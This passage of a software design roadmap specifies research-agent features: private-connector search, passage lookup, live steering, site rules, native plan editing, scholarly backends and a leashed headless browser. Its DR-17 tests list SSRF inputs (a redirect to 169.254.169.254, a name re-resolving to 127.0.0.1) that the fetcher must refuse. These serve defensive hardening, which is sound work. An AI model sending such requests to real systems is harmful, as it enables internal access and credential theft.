   - `open_private` stores the body (snapshot plus passages via `store.savePassages`) at the DR-04 address.
   - `note_finding` keeps its verbatim-quote rule unchanged.
3. **Budgets.**
   - Constants `MAX_PRIVATE_CALLS_PER_WORKER = 8` and `MAX_PRIVATE_CALLS_PER_RUN = 60`. The run-wide counter lives in the round's shared state.
   - Private calls count toward `maxToolCalls`. First-party calls are free; custom MCP calls are billed at the connector's metered cost when one is defined.
4. **Query hygiene across sources.**
   - A query to connector X is cleaned with a fingerprint built from the private rows of *every other source*: `privateFingerprint(run, {excludeConnector: X})`, filtering rows by the `connectorId~` URL namespace.
   - So text read from Gmail never goes out as a Slack, GitHub or custom-MCP query.
   - First-party providers are the person's own accounts. Third-party MCP servers get the same cleaning, plus the DR-01 URL rule for any `url` argument.
5. **GitHub and Notion.** Named adapters in `connector-sources.ts`:
   - GitHub: `search_issues` / `search_code` + `get_file_contents`.
   - Notion: its search and fetch tools.
   - **Verify the exact tool names against `tools/list` during implementation.** Both are offered at the gate like DR-04 connectors.
6. **Custom MCP (opt-in).**
   - A connector the person added is offered only when it has a tool with `accessFor === "read"` whose bare name starts with `search|query|find` and whose schema has a string parameter named `query|q|search|text|keywords`.
   - Default off, labelled "(custom)" in the option.
   - The result body is stored as one private row per call. There is no read step.
   - `readOnlyHint` is a hint from an untrusted server (`src/lib/tool-access.ts:13-17`). That is why this path is opt-in and sanitised.

**Security summary.**
- Read tools only.
- Unattended: an approval is a refusal.
- Connector text is wrapped with `wrapUntrusted` in results.
- No connector text reaches the planner.
- Cross-source query cleaning (step 4).
- URL guard (DR-01).

**Acceptance tests.** Extend `tests/research-agents.test.ts` and `tests/research-private-sources.test.ts`.
- With no connector enabled, the tools are not declared.
- Scripted worker: `search_private(gmail)` → `open_private` → `note_finding` produces a cited private source with "(your sources)".
- After `search_private` returns subject "Nightjar SLA credit", a following web `search("Nightjar SLA credit pricing")` is sent with both private terms stripped.
- A Slack query built from Gmail-only text is cleaned.
- The per-worker cap of 8 and the per-run cap of 60 hold.
- A custom MCP tool classified `write` or `unknown` is never called.
- A custom connector is not offered unless switched on.

---

## DR-10. `research_lookup`: follow-ups answered from everything the run read

**Size M. Impact M-H.** Requires DR-02.

**Problem (verified).**
- Follow-ups see only the report text (DR-02). A run reads 50–250 sources.
- `ResearchSource.snapshot`, `ResearchPassage` (`prisma/schema.prisma:4549-4563`, up to 40 passages per source, at most 900 characters each) and `ResearchFinding` (`:4523-4547`) are kept, but nothing in chat can query them.
- "What did the Gartner source say about Europe?" fails whenever that detail was read but not cited.
- No competitor documents this, so Alevr can lead.

**Change.**
1. **Tool module.** New `src/lib/agent/research-lookup.ts`, modelled on `src/lib/agent/document.ts`, with no static Prisma import. Tool `research_lookup {query: string, runId?: string}`.
2. **Retrieval.** Raw SQL over the run's passages, owner-scoped: join `ResearchPassage` → `ResearchSource` where `runId` and `userId` match. Score with `ts_rank(to_tsvector('simple', text), plainto_tsquery('simple', $q))` combined with the existing `contentTokens` overlap. Top 8.
   - About 10k rows per run at most, reached through the `sourceId` index; no migration needed.
   - Optional follow-up: a GIN expression index if p95 goes above 150 ms.
3. **Output.** Each passage is returned inside `wrapUntrusted`, with the source's **visible** number (from the completion message's `sources`, the DR-02 mapping), title, URL (private ones as their title only) and locator. A source that was read but not cited gets the next number after the cited ones, matching the message's "read" list order. Numbering stays stable across calls.
4. **Gating.** Attached in `src/lib/tools/entitlements.ts` (the same pattern as `read_document`, `:248`) when the conversation has any completed run. Add it to the tool list in `src/lib/chat/turn/run-turn.ts:117` and to `src/lib/chat/tool-policy.ts`. `runId` selects an older report; the default is the newest.
5. **Context.** With the tool available, DR-02's fallback paste shrinks to a header: title, summary, section headings and the visible source list, plus "call research_lookup for details". Models without tools keep the paste.

**Acceptance tests.** New file `tests/research-lookup.test.ts`.
- Returns only the caller's passages (another user's run id gives an empty result and no error detail).
- Visible numbering matches the message's `sources` order.
- A passage from a read-but-uncited source carries the right number from the "read" list.
- Header-only context is used when tools are available.
- DR-03 follow-up set: 20 questions whose answers sit in read but uncited sources are answered with a correct citation at least 70% of the time, against the DR-02 baseline.

---

## DR-11. Guidance applied live, and guidance or pins no longer lost during the lead's review

**Size S-M. Impact M.** Step 1 is a data-loss fix and can ship on its own.

**Problem (verified).**
1. **Lost update.**
   - `doWorkerRounds` loads `latestPlan` at `src/lib/research/stages/workers.ts:800`.
   - It then makes the lead-review model call (`:990`, seconds to a minute).
   - Then it saves `{...latestPlan, …}` (`:1131`).
   - `savePlan` overwrites the whole JSON with no compare-and-set (`src/lib/research/run.ts:269-277`).
   - So guidance (`plan.steering`), pinned URLs (`plan.pinnedSources`) or constraints that `engine.steer` (`src/lib/research/engine.ts:854-903`) saves during that window are silently lost.
   - The store already knows this hazard: `saveIssuedQueries` exists for this reason (`stages/types.ts` around `:136-141`; `run.ts:279-284`).
2. **Latency.**
   - Guidance applies only at the next round boundary (`workers.ts:556-562`; `applySteering`, `context.ts:331-341`).
   - Researchers run for up to 12 minutes per round (`MAX_WORKER_CLOCK_MS`, `envelope.ts`).
   - A URL pinned while researchers run (state `investigating`) is fetched only if the run passes through `reviewing` again (`REFETCH_FROM = ["reviewing"]`, `stages/states.ts:32-34`).
   - [O-DR]: ChatGPT changes scope and adds sources mid-run.

**Change.**
1. **Event-sourced steering (the fix).** `steering_queued` and `steering_applied {constraint|sourceUrl}` events are already appended (`engine.ts:874,885-894`) into an append-only log with a monotonic `seq`.
   - Add `plan.steeringSeq` (a watermark).
   - `applySteering` reads `store.readEvents({after: plan.steeringSeq})` for those kinds. It merges guidance into `constraints` and pins into `pinnedSources`, writes the plan, and advances the watermark.
   - `engine.steer` stops writing `constraints` and `pinnedSources` directly. It only appends events. It keeps updating `plan.steering` for display through a new atomic `store.appendPlanList({key: "steering"})` (`jsonb_set` with `||`, like `saveIssuedQueries`).
   - Any later whole-plan save can at worst drop the display cache. It can never lose the guidance itself.
2. **Live delivery.**
   - `RunWorkerInput` gains `guidance(): Promise<Array<{seq, text, sourceUrl?}>>`. It reads the same events after the worker's start seq, polled at most every 15 s.
   - In `worker-loop.ts`, before each model turn, append new entries as a text block after that turn's tool results: "The person just added guidance: … Adjust your remaining searches." For a pin: "The person pinned <url>; open it if it bears on your sub-question."
   - Add an optional `note` argument to `Adapter.pushToolResults`, appended at the end only, so the prompt-cache prefix holds.
   - The pinned URL is allowed by DR-01 because it is in `plan.pinnedSources` after the merge, or in a `pinned` set read from the events.
3. **Events and view.**
   - New event `steering_applied_live {workerId, seq}`.
   - `src/lib/research/view.ts` derives "Applied by N researchers" for each entry.
   - Paused runs have no researchers running, so their guidance stays queued, as today.

**Acceptance tests.**
- **Race.** Interleave `steer({guidance})` between the `:800` load and the `:1131` save, using a store hook in `tests/fixtures/research-store.ts`. The guidance survives and applies at the next boundary.
- Scripted worker: a guidance entry is inserted after turn 2. Turn 3's transcript contains it, and `steering_applied_live` names the worker.
- The boundary conversion still happens exactly once per entry (by watermark).
- A pin added mid-round is opened by a researcher in that round, and DR-01 allows it.
- Guidance while paused stays queued.

---

## DR-12. Cited figures (charts) in reports

**Size S-M. Impact M.** DR-05 makes `quantitative`, `timeline` and `landscape` reports use it most.

**Problem (verified).**
- Reports are plain Markdown in the reader (`src/components/research/report-document.tsx:148-162`, `Markdown` per sentence group).
- Live UI already renders `chart` (line, area, bar) and `timeline` components (`src/lib/live-ui/spec.ts:143-170`), and the chat Markdown renders Live UI fences (`components/chat/markdown.tsx:19-50`). The writer is never asked for figures.
- [O-FEB]: ChatGPT reports have charts and visual summaries.

**Change.**
1. **Writer contract** (`corpus.prompt.ts`): optional, at most 3 per report. A figure is `<!-- juno:figure kind="bar|line|timeline" title="…" unit="…" -->` directly followed by a Markdown table: x, y and a citation column, with `[n]` on every row.
   - Because a figure is a table, the existing table-cell audit (`tableClaims`) checks every plotted value. Nothing new is needed.
2. **Parser.** New pure `src/lib/research/report-figures.ts`. `parseFigures(report)` turns each block into `{kind, title, unit, rows: [{x, y, cites}]}`. It drops rows that have no `[n]` or whose audit verdict is not `supported`. `figureToLiveSpec(figure)` produces a Live UI `chart` or `timeline` spec.
3. **Reader.**
   - In `report-document.tsx`, before `sentenceGroups`, replace each figure block with an atomic group that renders the Live UI chart, with the table behind a "Data" disclosure.
   - The caption carries the unit, the date range and the citations.
   - On parse failure, render the table.
4. **Fallbacks.** Print, DOCX, native readers and the chat message keep the table. The HTML comment is invisible in Markdown.

**Acceptance tests.** New file `tests/research-figures.test.ts`.
- A figure block parses to a chart spec.
- A row without `[n]` is dropped from the chart and flagged by the audit.
- A row the audit judged `unsupported` is excluded from the chart but stays in the table, annotated.
- Malformed blocks render as tables.
- Snapshot: the `quantitative` contract mentions figures, and the `decision` contract allows them.

---

## DR-13. Site rules: only these sites, never these sites

**Size S-M. Impact M.** Requires DR-01, because both touch `openPage`.

**Problem (verified).**
- Only `pinnedSources` exists, documented as "priorities, not a domain allowlist" (`docs/research-workspace.md:117-118`; fetched in `stages/corpus.ts:341-370`).
- No engine call takes a domain filter. A grep for `include_domains`, `includeDomains` and `excludeDomains` over `src/` finds nothing for research.
- [O-DR]: ChatGPT can *restrict* to listed sites or *prioritize* them. Alevr's pins already cover "prioritize".

**Change.**
1. **Plan field.** `plan.siteRules?: {only: string[], never: string[]}`.
   - Hostnames are normalised through `new URL("https://" + h).hostname`.
   - IP literals and non-public hosts (`isDisallowedHost`) are rejected. Maximum 20 each.
   - Accepted by `startResearchSchema`, `decidePlanSchema` and the steer schema in `src/app/api/research/protocol.ts`. A steer applies it like guidance (DR-11).
2. **Enforcement.**
   - `alevrSearch` takes `siteRules`:
     - Serper and Brave: `(site:a OR site:b)` for `only` (at most 10 hosts per query; split larger lists across queries) and `-site:x` for `never`.
     - Tavily: `include_domains` / `exclude_domains`.
     - Exa: `includeDomains` / `excludeDomains`.
     - **Check each parameter against the vendor's current API docs when implementing.**
   - Post-filter fused results by host, subdomains included.
   - The query cache key includes the rules.
   - `bindWorkerTools.openPage` and the link hop refuse URLs outside the rules and tell the researcher why. Pinned URLs are exempt because the person chose them.
   - The widening sweep (`src/lib/research/broaden.ts`) stays inside the rules.
3. **Honesty.** When `only` yields fewer than 3 readable sources after the seed sweep, append `{kind:"error", payload:{scope:"site_rules", recoverable:true}}` and say so in methodology. The run never quietly leaves the rule.
4. **Gate UI.** Two token fields under Sources on the web scope card. The native gate gets them in DR-14.

**Acceptance tests.**
- A spy on every engine call shows the restriction in every issued query, per engine format.
- A fused hit from a `never` host is dropped.
- A researcher opening a forbidden URL is refused with no fetch.
- A pinned URL outside `only` is still read.
- A steer that adds `never` mid-run applies from the next tool call (with DR-11).
- An over-restricted run records the recoverable error.

---

## DR-14. Native (iOS and macOS) plan gate parity

**Size M. Impact M.**

**Problem (verified).**
- `decideResearchPlan(confirm:)` sends only `{"decision": "confirm"|"cancel"}` (`native/Packages/JunoNativeKit/Sources/JunoChatKit/NativeResearchRun.swift:750-767`).
- The native model decodes `questions` and `sources` for display, but no plan-source options. Native code has no edit or revise path.
- The server accepts `questions`, `answers`, `sources`, `pinnedSources` and `decision: "revise"` (`src/app/api/research/protocol.ts:113-142`; `engine.ts:583-717`).
- A run started on iPhone or Mac is a lesser run. ChatGPT's apps can edit the plan, and Claude Mobile skips connectors entirely [C-R], so parity here puts Alevr ahead on mobile.

**Change.**
1. **Decode** `plan.sources.options` and `enabled`, `plan.objectives` (id plus question), `plan.clarifications`, and, when present, `scope.archetype` (DR-05) and `plan.siteRules` (DR-13) into `NativeResearchRun`. Use `LossyList` decoding as the existing fields do.
2. **API.** `decideResearchPlan(_ decision: PlanDecision, edits: PlanEdits?)`, where `PlanDecision` is `.confirm | .revise | .cancel` and `PlanEdits` is `{questions: [{id?, question}], answers: [String: String], sources: {web: Bool, enabled: [String]}, pinnedSources: [String], archetype: String?, siteRules: {only, never}?}`. It encodes exactly to `decidePlanSchema`.
3. **Plan editor view**, using the redesign's components:
   - edit, reorder, delete or add questions (1–8);
   - answer clarifications;
   - source toggles with labels and kind glyphs from `NativeResearchSourceIcons.swift`;
   - pinned URLs;
   - site rules and archetype when the server sends them;
   - Revise and Start.
4. **Shared code.** The JunoNativeKit model is shared by iOS (`native/iOS/JunoMobile/App/JunoMobileResearch.swift`) and macOS (`native/macOS/JunoDesktop/App/ResearchViews.swift`).

**Acceptance tests.**
- `NativeResearchRunStageBTests`: options and objectives decode, and an unknown archetype decodes as nil.
- The revise request body round-trips against a JSON fixture produced from the zod schema. Add it under `contracts/` and run it in `npm run capabilities:check`.
- The JSON for `.confirm` with no edits is byte-identical to today's.
- Snapshot tests (`ResearchStageBSnapshotTests`): the editor with 5 questions and 3 sources, light and dark.
- Manual: edit a question on iPhone and press Start; the web view shows the edited question.

---

## DR-15. Scholarly, medical and filings search backends

**Size M. Impact M (source quality on academic, medical and finance questions).** Builds on DR-08's backend plumbing.

**Problem (verified).**
- Backends are Serper, Brave, Tavily, Exa, SearXNG and Wikipedia (`src/lib/search/alevr/backends.ts:129-200`).
- No OpenAlex, arXiv, PubMed or EDGAR backend exists anywhere; a grep over `src`, `runner`, `relay` and `native` finds them only in a comment in `src/lib/search/fusion.ts` and in host tiers in `src/lib/research/source-policy.ts`.
- [C-ENG] favours primary sources.

**Change.**
1. **Verticals.** `SearchVertical` gains `"scholarly" | "medical" | "filings"` (`src/lib/search/alevr/types.ts`).
2. **Backends.** New `open_data` backends at cost 0 in `backends.ts`, with HTTP in a new `src/lib/search/open-data.ts`:
   - **OpenAlex.** `GET https://api.openalex.org/works?search=<q>&per-page=10&mailto=<OPS_CONTACT_EMAIL>`. The abstract is rebuilt from `abstract_inverted_index` as the snippet. URL: the `doi.org` link, else the OpenAlex landing page.
   - **arXiv.** `export.arxiv.org/api/query`, Atom feed, at most 1 request every 3 s through a process-wide limiter. URL: `arxiv.org/abs/<id>`.
   - **PubMed.** E-utilities `esearch` then `esummary` (JSON). 3 requests/s, or 10 with `NCBI_API_KEY`. URL: `pubmed.ncbi.nlm.nih.gov/<pmid>/`.
   - **SEC EDGAR full-text search.** `efts.sec.gov/LATEST/search-index?q=…`, with a `User-Agent` that carries a contact address (EDGAR's fair-access rule), at most 10 requests/s. URL: the filing document under `sec.gov/Archives`.
   - **Check each endpoint, parameter and rate limit against the provider's current docs when implementing.**
3. **Routing.**
   - Planner vectors whose `primarySources` match a vocabulary list get vertical queries:
     - scholarly: paper, study, journal, preprint, meta-analysis;
     - medical: trial, PubMed, guideline;
     - filings: 10-K, 10-Q, 8-K, SEC filing, proxy.
   - Researchers get `search {query, vertical?: "web"|"scholarly"|"medical"|"filings"}`, described in `WORKER_TOOLS`.
   - Vertical results are fused with web results at a weight below web (0.7), so consumer questions are not flooded.
4. **Reading.** Fetching and reading are unchanged: the crawler reads these hosts, and PDFs go through the layout reader.

**Acceptance tests.** Fixture-based, with no network, in `tests/search-open-data.test.ts`.
- An OpenAlex response parses to hits with DOI URLs and rebuilt abstracts.
- arXiv Atom parses, and the limiter spaces calls at least 3 s apart (fake clock).
- PubMed esearch plus esummary give PMIDs and titles.
- EDGAR sends the `User-Agent` header.
- A vector with `primarySources: ["peer-reviewed trials"]` issues at least one medical-vertical query.
- DR-03 evidence-review cases: the share of cited primary scholarly sources goes up and completeness does not drop.

---

## DR-16. Extend or refresh a report (run lineage)

**Size M. Impact M.** No competitor documents this, so Alevr can lead.

**Problem (verified).**
- "Go further" only prefills the composer (`src/components/research/research-recap.tsx:204-207`). A new run redoes everything.
- `ResearchRun` has no parent link (`prisma/schema.prisma:4427-4472`).
- The page and query caches already make re-reads cheap (`tools.ts` `crawlThroughCache`, conditional revalidation).

**Change.**
1. **Migration, additive.**
   - `ResearchRun.parentRunId String?` with `@@index([parentRunId])`.
   - `ResearchSource.inheritedFromId String?`.
   - `plan.lineage?: {parentRunId, mode: "extend"|"refresh", since: ISO}`.
2. **API.** `startResearchSchema` gains `parent?: {runId, mode}`. The route checks that the parent belongs to the caller (`userId`) and is terminal with a report. The new run uses the parent's `conversationId`.
3. **Planning.**
   - The planner gets the parent's objectives, gap-audit entries and round `openQuestions`, wrapped as reference.
   - **Extend:** vectors are the parent's open items.
   - **Refresh:** the parent's vectors with `freshness` set relative to `since`.
   - The parent's `issuedQueries` and `workerQueries` seed `shared.issued`, so near-duplicates are refused across the lineage.
4. **Corpus.**
   - Copy the parent's citable sources as new rows (snapshot and passages copied, `inheritedFromId` set), so numbering and the audit work unchanged.
   - **Refresh** re-reads each inherited *web* source through the page cache (conditional request). A changed `contentHash` replaces the snapshot and marks the source changed; an unchanged one is kept.
   - Private sources are re-queried through DR-04, never copied, so revoked access is respected.
5. **Writer.** A new `changes` section marker, "What changed since <date>", fed by `metric-match.ts` (figure diffs) and the changed-source list. When nothing changed, the report says so in one line.
6. **UI hooks.** "Go further" and "Update this report" in the recap call the start route with `parent`. Labels only; the visual design is the redesign's job.
7. **Out of scope.** Scheduled refresh. It is a follow-up using Work schedules (`src/lib/work/triggers.ts`) that notifies only when the report materially changed.

**Acceptance tests.**
- Starting with another user's `parent.runId` returns 404.
- An extend run issues no query that is a near-duplicate of the parent's ledger.
- Inherited sources keep their passages, and the audit can cite them.
- Refresh with unchanged hashes fetches with conditional requests only and writes "no material change".
- A changed figure appears in `changes` with both values cited.
- The migration is additive: old runs read `parentRunId = null`.

---

## DR-17. Read JavaScript-only pages through the leashed Work browser

**Size M. Impact M.**

**Problem (verified).**
- **Off and unconfigured in production.** Headless rendering is opt-in (`RESEARCH_HEADLESS`, `src/lib/research/crawler.ts:83-86`). It is not set in `deploy/ecosystem.config.js` or `render.yaml`. Pure client-rendered pages end as `needs_browser` or `empty_document`.
- **Unsafe as written.** The existing path imports the dev dependency `@playwright/test` and launches a **new browser per page** with `--no-sandbox` (`crawler.ts:164-185`). It checks DNS before each request, but Chromium resolves names itself, so a DNS-rebinding window remains (`crawler.ts:108-118`, which calls it a residual risk).
- **A safer browser already exists.** The Work browser (`src/lib/work/browser.ts:331`, `createWorkBrowser`) routes **every** request (navigation, subresources, XHR) through a caller-supplied `fetchResource`. It blocks WebSockets and service workers. In production it is wired to `fetchPinnedWebPage`, which pins the checked address (`scripts/work-runner.ts:2054-2080`). Chromium is already installed on the VM for `juno-work`.

**Change.**
1. **Leashed renderer.** Replace the crawler's headless branch with `renderLeashed(url, signal)` in a new `src/lib/research/render.ts`. It uses `createWorkBrowser({fetchResource, executablePath: WORK_BROWSER_EXECUTABLE})` where `fetchResource`:
   - allows `GET` only;
   - goes through the same pinned fetcher (`fetchPinnedWebPage`) with the research SSRF rules;
   - sends no cookies;
   - caps each response at 5 MB.

   It returns `browser.read()` text after network idle, with an 8 s cap.
2. **Resources.**
   - One browser per process, shared, with a semaphore of 1 render at a time. It closes after 30 s idle. At most `MAX_RENDERS_PER_RUN = 15`.
   - Called only when `shouldRenderHeadless` (`crawler.ts:68-71`) says the fast path got a shell. The per-host limiter still applies.
   - The result is cached in the page cache like any fetch.
3. **Rollout.** Enable through `RESEARCH_HEADLESS=1` in `deploy/ecosystem.config.js` for the processes that drive research (`juno-backend` nudges, `juno-sweepers` adoption), once memory has been checked on the 1 GB VM. Note the `max_memory_restart` values there.
4. **Cleanup.** Remove the `@playwright/test` import from production code.

**Acceptance tests.**
- **Fixture SPA** (`tests/fixtures/reading/empty-spa.html`, served locally): the rendered text is extracted and tables are kept.
- **SSRF:** a subresource or redirect to `169.254.169.254`, or to a name that re-resolves to `127.0.0.1`, is refused by `fetchResource`. Test it with a stub resolver.
- A WebSocket from the page is closed. A POST from the page is refused.
- The 15-render cap holds. With concurrency 1, two parallel requests serialize.
- DR-03: the share of `needs_browser` and `empty_document` outcomes among selected sources drops by at least 70%.

---

## 2. Build order

1. **Wave A, about 2 weeks, mostly invisible and fast to ship:**
   - DR-01 (security, before any connector work);
   - DR-02;
   - DR-03 in `--dry` mode first, then live;
   - DR-07;
   - DR-11 step 1, the lost-update fix.
2. **Wave B, the biggest user-felt changes:**
   - DR-04, then DR-09;
   - DR-05;
   - DR-06;
   - DR-08.

   Each of DR-05, DR-06 and DR-08 merges only with a DR-03 run attached.
3. **Wave C:** DR-10, DR-11 step 2, DR-12, DR-13, DR-14.
4. **Wave D:** DR-15, DR-16, DR-17.

## 3. Checked and found strong (do not rework)

- **Claim-level citation audit and verbatim-passage hover cards:** `src/lib/research/citation-audit-core.ts`, `src/components/research/citation-card.tsx`.
- **Web-query privacy guard:** `stages/context.ts:457-512`. Sound for queries; DR-01 closes the URL gap.
- **Durability:** leases, sweeper adoption, bounded stage retries, recovery floors.
- **Notifications:** web, push, iOS.
- **Planner and sweep machinery:** MECE checks, near-duplicate guard, leads, gap audit, adaptive depth.
- **Reading depth:** PDF layout reading and embedded-data extraction.
- **Research-path engine calls** already ask each engine for exactly `count` and request Exa highlights.

## 4. Dropped or changed from the audit, and why

- **False claims, removed:**
  - "each engine is asked for 1.5x results" and "use Exa highlights instead of text" (audit R8). The research path already passes `perEngineCount: query.count` and `exaContents: "highlights"` (`search/alevr/backends.ts:35-50`).
  - The audit's per-query cost ($0.07 at 20 results, Exa 80%) is corrected to $0.052 at 20 (Exa about 70%) from `metering.ts`.
- **Draft streaming of the report** (audit R5 step 4). Dropped. It shows unaudited claims that the audit may later correct, and it adds whole-plan JSON writes during the window where DR-11 found updates being lost. DR-06's shorter path is the safer route to a faster report.
- **Per-engine spend in the methodology footprint** (audit R8 step 3). Low value to the reader. DR-03 reports it for the team instead.
- **Worker model class (Haiku vs Sonnet)** (audit row 13). Not an item. A DR-03 experiment decides it.
- **"Ask about this" selection button** (audit R3 step 4). Pure UI with no capability behind it; left to the redesign. DR-10 delivers the capability.
- **Scheduled monthly refresh** (audit R10 step 5). Split out of DR-16 so that item stays one PR. Listed as a follow-up.
- **Re-scoped, not dropped:**
  - Audit R1 was split into DR-04 (sweep) and DR-09 (in-loop tools). A required security prerequisite, DR-01, was added because it is a real leak today. Cross-source query cleaning and storing private hit lists in the fingerprint were added to DR-09.
  - Audit R2 was split into archetypes (DR-05) and figures (DR-12).
  - Audit R3 was split into the numbering fix (DR-02, which also stops the double paste the audit missed) and retrieval (DR-10).
  - Audit R6 gained the lost-update bug fix (DR-11).
  - Audit R11 now uses the leashed Work browser instead of a new render service, because the existing crawler path runs `--no-sandbox` with a DNS-rebinding window.
